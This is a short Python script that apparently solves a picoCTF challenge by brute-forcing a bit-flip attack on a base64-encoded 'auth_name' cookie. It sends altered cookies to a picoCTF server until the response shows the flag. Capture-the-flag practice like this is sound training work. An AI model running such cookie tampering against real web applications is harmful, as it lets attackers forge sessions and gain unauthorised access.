import requests
from base64 import b64decode, b64encode
import itertools as it

# Current used key from cookie
b64encoded_key = "VlRzS05EaG9nRTZ1SHFpRU83RzUvTVZUdHhQUG0xSzQ0a2lGWlZDZWhlU2JqUGlVUTFvVDBMQWNxd0tFY1l0N1VvaElKdklnNFl1aFdpMStoTHltU3QwRURWaVlKR0gybnRuVXgrNGlPVTV6V1diMlRtV0lGazlMdmg3UmdCQ2o="
url = 'http://mercury.picoctf.net:21553/'

raw_key = b64decode(b64encoded_key).decode()

def bitFlip(pos, bit, raw):
    key_temp = list(raw)
    key_temp[pos] = chr(ord(raw[pos])^bit)
    key_temp = ''.join(key_temp)
    return b64encode(key_temp.encode()).decode()

def solve():
    for i in range(len(raw_key)):
        # Valid characters are: A-Z, a-z, 0-9 for encrypted string
        for j in it.chain(range(48,58), range(65, 91), range(97, 123)):
            cookies = {
                'auth_name': bitFlip(i, j, raw_key)
            }
            print("Using cookie: " + cookies['auth_name'])
            print("Resquest at index: %s, character: %s" % (i, chr(j)))
            response = requests.get(url, cookies=cookies)

            if 'picoCTF' in response.text:
                print(response.text)
                return

if __name__ == '__main__':
    solve()




